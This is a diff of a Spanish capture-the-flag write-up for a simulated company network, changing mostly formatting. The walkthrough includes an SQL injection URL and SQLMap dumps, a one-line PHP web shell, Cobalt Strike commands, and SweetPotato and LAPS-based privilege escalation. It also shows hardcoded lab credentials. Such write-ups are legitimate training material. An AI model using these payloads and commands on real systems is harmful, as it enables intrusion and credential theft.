@@ -1,21 +1,20 @@
 # Introducción
 
-```
 
-El objetivo del reto es comprometer a la Empresa "La Ciberreserva". La idea es simular lo que podría ser la infraestructura de una empresa real con la que te encontrarías en un ejercicio de Red Team. Este reto no esta centrado en la evasión, pero es posible que tengas que hacer un uso mínimo de ello para avanzar en tu fase de compromiso.
+>El objetivo del reto es comprometer a la Empresa "La Ciberreserva". La idea es simular lo que podría ser la infraestructura de una empresa real con la que te encontrarías en un ejercicio de Red Team. Este reto no esta centrado en la evasión, pero es posible que tengas que hacer un uso mínimo de ello para avanzar en tu fase de compromiso.
+>
+>Hay un total de 8 flags repartidas en las 6 máquinas del dominio. Las flags siguen el formato de bitup21{MD5}, y en la descripción de cada Challenge podrás ver la ruta donde se encuentran. 
+>
+>Puedes usar las herramientas con las que te sientas más cómodo, de hecho recomendamos utilizar algún Framework de C2 como Metasploit, Covenant, Empire o Cobaltstrike. Eso ya lo dejamos a tu gusto.
+>
+>Unas consideraciones finales:
+>
+>- Todo ejercicio de Red Team comienza por una fase de **OSINT**. Así que no os centreis sólo en las máquinas visibles de la VPN.
+>- No te lies con la enumeración de subdominios de ciberreserva.com. Este tan sólo es el dominio principal y la única web externa que deberías tener en cuenta.
+>- Sobretodo piensa antes de tirarte de lleno con algo, ten muy en cuenta como podemos haber montado el reto y sobretodo las reglas citadas anteriormente. Si tienes esto en mente, te ayudará a encontrar el camino correcto.
+>
+>Y ahora si, te deseo mucha suerte a ti y a tu equipo en esta aventura! Preparate...por que vas a sudar la gota gorda (;
 
-Hay un total de 8 flags repartidas en las 6 máquinas del dominio. Las flags siguen el formato de bitup21{MD5}, y en la descripción de cada Challenge podrás ver la ruta donde se encuentran. 
-
-Puedes usar las herramientas con las que te sientas más cómodo, de hecho recomendamos utilizar algún Framework de C2 como Metasploit, Covenant, Empire o Cobaltstrike. Eso ya lo dejamos a tu gusto.
-
-Unas consideraciones finales:
-
-- Todo ejercicio de Red Team comienza por una fase de **OSINT**. Así que no os centreis sólo en las máquinas visibles de la VPN.
-- No te lies con la enumeración de subdominios de ciberreserva.com. Este tan sólo es el dominio principal y la única web externa que deberías tener en cuenta.
-- Sobretodo piensa antes de tirarte de lleno con algo, ten muy en cuenta como podemos haber montado el reto y sobretodo las reglas citadas anteriormente. Si tienes esto en mente, te ayudará a encontrar el camino correcto.
-
-Y ahora si, te deseo mucha suerte a ti y a tu equipo en esta aventura! Preparate...por que vas a sudar la gota gorda (;
-```
 
 # Infraestructura
 
@@ -121,7 +120,7 @@ Utilizando nmap, vemos que dos máquinas responden: `192.168.56.111`(Lambda) y e
 # Omega - Acceso inicial
 
 Lambda es la primera máquina a la que tenemos acceso en la red del laboratorio, revisando los puertos abiertos, vemos la interfaz web del servidor de correo en el puerto `443`.
-```
+```text
 nmap scan report for 192.168.56.111
 Host is up (0.062s latency).
 Not shown: 978 filtered ports
@@ -173,7 +172,7 @@ Con esta información, asumimos que si enviamos un documento Word con macros a A
 
 Tras varios intentos de prueba y error, con ficheros tanto xlsm como docm, logramos encontrar la macro que nos proporciona acceso a la máquina:
 
-```
+```vbscript=
 Rem Attribute VBA_ModuleType=VBAModule
 Option VBASupport 1
 Rem Attribute VBA_ModuleType=VBAModule
@@ -209,12 +208,12 @@ Accediendo a esta ruta, encontramos el ejecutable del que se habla. Haciendo rev
 
 Concretamente, encontramos las credenciales hardcodeadas en estas líneas:
 
-```
-    private string exchange_url = "https://mail.ciberreserva.com/EWS/Exchange.asmx";
-    private string domain_user = "ciberreserva\\arubio";
-    private string domain_password = "P4g4F4nt4sSupr3m3!";
-    private string mail_from = "benito.antonanzas@ciberreserva.com";
-    private string attachments_path = "C:\\Users\\arubio\\Downloads\\";
+```csharp
+private string exchange_url = "https://mail.ciberreserva.com/EWS/Exchange.asmx";
+private string domain_user = "ciberreserva\\arubio";
+private string domain_password = "P4g4F4nt4sSupr3m3!";
+private string mail_from = "benito.antonanzas@ciberreserva.com";
+private string attachments_path = "C:\\Users\\arubio\\Downloads\\";
 ```
 ## Email Angel Rubio
 
@@ -244,7 +243,7 @@ http://kappa.ciberreserva.com:8000/post.php?id=3%27%20or%20%271%27=%271
 
 Utilizamos SQLMap para exfiltrar toda la información posible, obteniendo cuentas de email y hashes de contraseñas cifradas con bcrypt.
 
-```
+```text
 Database: cbms
 Table: users
 [4 entries]
@@ -277,14 +276,13 @@ Table: posts
 Descartamos la idea de hacer fuerza bruta sobre estos hashes, teniendo en cuenta que las credenciales descubiertas con anterioridad siguen una política que nos indica que es poco probable que las encontremos en un diccionario, además de estar cifradas con bcrypt, que requiere demasiado esfuerzo computacional para romperse.
 
 Intentamos insertar un user en la tabla, pero no funciona (probablemente porque las stacked queries están bloqueadas):
-```
+```sql
 insert into users(email, password) values ('jefaso@tujefe.com', '$2y$10$59szyfc2uBio4wn.i8yfUuLNczb3NGWG0voVccbjX7DIOOEl8EF2m')
-
 ```
     
 Analizando un poco más a fondo la información obtenida, nos damos cuenta de que existe una base de datos adicional a la que podemos acceder: fmanager.
 
-```
+```text
 available databases [3]:
 [*] cbms
 [*] fmanager
@@ -293,7 +291,7 @@ available databases [3]:
 
 Así que procedemos a volcar la información de esta base de datos
 
-```
+```text
 Database: fmanager
 Table: users
 [3 entries]
@@ -329,49 +327,12 @@ Table: files
 | 24 | disable_func_bypass.php                        | text/x-php            | C:\\inetpub\\wwwroot\\files\\disable_func_bypass.php                        | demo   | 2021-10-26 04:59:46 |
 | 25 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:01:16 |
 | 26 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:04:40 |
-| 27 | new1.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new1.php                                       | demo   | 2021-10-26 05:05:25 |
-| 28 | new2.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new2.php                                       | demo   | 2021-10-26 05:05:53 |
-| 29 | new3.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new3.php                                       | demo   | 2021-10-26 05:07:00 |
-| 30 | new4.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new4.php                                       | demo   | 2021-10-26 05:09:38 |
-| 31 | new6.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new6.php                                       | demo   | 2021-10-26 05:13:02 |
-| 32 | new8.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new8.php                                       | demo   | 2021-10-26 05:14:11 |
-| 33 | new9.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new9.php                                       | demo   | 2021-10-26 05:17:04 |
-| 34 | new10.php                                      | text/html             | C:\\inetpub\\wwwroot\\files\\new10.php                                      | demo   | 2021-10-26 05:20:02 |
-| 35 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:21:32 |
-| 36 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:22:51 |
-| 37 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:23:44 |
-| 38 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:24:15 |
-| 39 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:24:49 |
-| 40 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:25:20 |
-| 41 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:25:27 |
-| 42 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:26:08 |
-| 43 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:26:59 |
-| 44 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:27:25 |
-| 45 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:27:50 |
-| 46 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:28:07 |
-| 47 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:31:51 |
-| 48 | new.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\new.php                                        | demo   | 2021-10-26 05:32:27 |
-| 49 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:38:00 |
-| 50 | rcat.exe                                       | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\rcat.exe                                       | demo   | 2021-10-26 05:41:56 |
-| 51 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:42:42 |
-| 52 | now.php                                        | text/html             | C:\\inetpub\\wwwroot\\files\\now.php                                        | demo   | 2021-10-26 05:45:32 |
-| 53 | petit.exe                                      | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\petit.exe                                      | demo   | 2021-10-26 06:00:33 |
-| 54 | petit.exe                                      | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\petit.exe                                      | demo   | 2021-10-26 06:04:20 |
-| 55 | rottenpotato.exe                               | application/x-empty   | C:\\inetpub\\wwwroot\\files\\rottenpotato.exe                               | demo   | 2021-10-26 06:13:47 |
-| 56 | m.txt                                          | text/plain            | C:\\inetpub\\wwwroot\\files\\m.txt                                          | demo   | 2021-10-26 06:34:23 |
-| 57 | m.txt                                          | text/plain            | C:\\inetpub\\wwwroot\\files\\m.txt                                          | demo   | 2021-10-26 06:44:40 |
-| 58 | m.txt                                          | text/plain            | C:\\inetpub\\wwwroot\\files\\m.txt                                          | demo   | 2021-10-26 06:46:15 |
-| 59 | m.txt                                          | text/plain            | C:\\inetpub\\wwwroot\\files\\m.txt                                          | demo   | 2021-10-26 07:10:32 |
+| 27 | new1.php                                       | text/html             | C:\\inetpub\\wwwroot\\files\\new1.php                                       | demo   | 2021-10-26 05:05:25 
+    [...]
 | 60 | kaka.txt                                       | text/plain            | C:\\inetpub\\wwwroot\\files\\kaka.txt                                       | demo   | 2021-10-26 07:37:41 |
 | 61 | JuicyPotato_tuneado.exe                        | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\JuicyPotato_tuneado.exe                        | demo   | 2021-10-26 07:48:33 |
-| 62 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 08:17:57 |
-| 63 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 08:23:11 |
-| 64 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 09:11:19 |
-| 65 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 09:12:03 |
-| 66 | kaka2.txt                                      | text/plain            | C:\\inetpub\\wwwroot\\files\\kaka2.txt                                      | demo   | 2021-10-26 09:22:16 |
-| 67 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 09:24:46 |
-| 68 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 09:36:11 |
-| 69 | kakanew.exe                                    | application/x-dosexec | C:\\inetpub\\wwwroot\\files\\kakanew.exe                                    | demo   | 2021-10-26 09:45:04 |
+| 62 | kakanew.exe                                    | application/x-dosexec 
+    [...]
 +----+------------------------------------------------+-----------------------+-----------------------------------------------------------------------------+--------+---------------------+
 ```
 
@@ -398,7 +359,7 @@ Además, con estas credenciales se nos permite subir ficheros como esperábamos.
 
 Una vez tenemos acceso al gestor de ficheros, procedemos a subir una shell en PHP llamada chell.php, con el siguiente contenido:
     
-```
+```php
 <?php system($_GET['zekret']); ?>
 ```
 
@@ -412,13 +373,13 @@ http://kappa.ciberreserva.com/files/chell.php?zekret=dir
 
 Subimos de nuevo el helloworld.exe y un smbcifrado.bin para crear un named pipe en la nueva máquina. Ejecutamos:
 
-```
+```bash
 proxychains curl -v http://kappa.ciberreserva.com/files/chell.php?zekret=helloworld.exe+smbcifrada.bin
 ```
 
 Y desde Cobalt Strike creamos un link desde la maquina que controlamos:
     
-```
+```bash
 link 192.168.56.116 nombredelpipe
 ```
 
@@ -441,7 +402,7 @@ Una vez ganado el acceso y habiendo visto que no tenemos acceso a una flag, come
     
 Los privilegios de la máquina son los siguientes:
 
-```
+```text
 Nombre de usuario SID     
 ================= ========
 nt authority\iusr S-1-5-17
@@ -491,7 +452,7 @@ El CLSID para el sistema operativo concreto (Windows Server 2016) lo encontramos
 
 Después de unas cuantas pruebas, conseguimos acceso a través del comando:
 
-```
+```bash
 execute-assembly /home/kali/bitupFinal/SweetPotato.exe --clsid=7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381 -p werfault.exe -l 6659 -s <shellcode>
 ```
     
@@ -519,7 +480,7 @@ SweetPotato by @_EthicalChaos_
 
 ```
 
-Habiendo funcionado el shellcode, linkamos a la nueva sesión:
+Habiendo funcionado el shellcode, creamos un link a la nueva sesión:
     
 ```
 link 192.168.56.116 WkSvcPipeMgr_YLOQf5
@@ -531,10 +492,9 @@ Flag: `bitup21{25123457f4c7f09c3cbc326bd1e113ea}`
 
 # Omega - Escalando privilegios
     
-Una vez hemos ganado acceso como administradores, vamos a hacer un alto en el camino para analizar la red y ver a qué máquinas podemos llegar desde nuestra situación actual. Para hacer el reconocimiento de dominio utilizamos la herramienta `Bloodhoun` junto al ingestor en C# `SharpHound`.
+Una vez hemos ganado acceso como administradores, vamos a hacer un alto en el camino para analizar la red y ver a qué máquinas podemos llegar desde nuestra situación actual. Para hacer el reconocimiento de dominio utilizamos la herramienta `Bloodhound` junto al ingestor en C# `SharpHound`.
 
-
-En el grafo generado por la herramienta, marcamos las maquinas que hemos comprometido y, revisando las relaciones, vemos una arista interesante: Kappa puede leer las credenciales de admin local (`ReadLAPSPassword`) de Omega.
+En el grafo generado por la herramienta, marcamos las máquinas que hemos comprometido y, revisando las relaciones, vemos una arista interesante: Kappa puede leer las credenciales de admin local (`ReadLAPSPassword`) de Omega.
 
 ![](https://i.imgur.com/nvJzE17.png)
 
@@ -542,19 +502,17 @@ En el grafo generado por la herramienta, marcamos las maquinas que hemos comprom
 
 Usamos el siguiente comando de powershell desde la máquina Kappa para sacar la password de admin local de Omega:
     
-```
+```powershell
 Get-AdmPwdPassword -ComputerName 'OMEGA'
 ```
 
 Pero no funciona porque no están las herramientas de LAPS instaladas en la máquina. Revisando la documentación, vemos que la contraseña se almacena como propiedad del ordenador en el AD, por lo que si pedimos todas las propiedades del objeto OMEGA deberíamos obtenerla.
 
-```
+```bash
 raul beacon> powershell Get-AdComputer -Identity "OMEGA" -Properties *
 [*] Tasked beacon to run: Get-AdComputer -Identity "OMEGA" -Properties *
 [+] host called home, sent: 187 bytes
 [+] received output:
-#
-
 
 AccountExpirationDate                : 
 accountExpires                       : 9223372036854775807
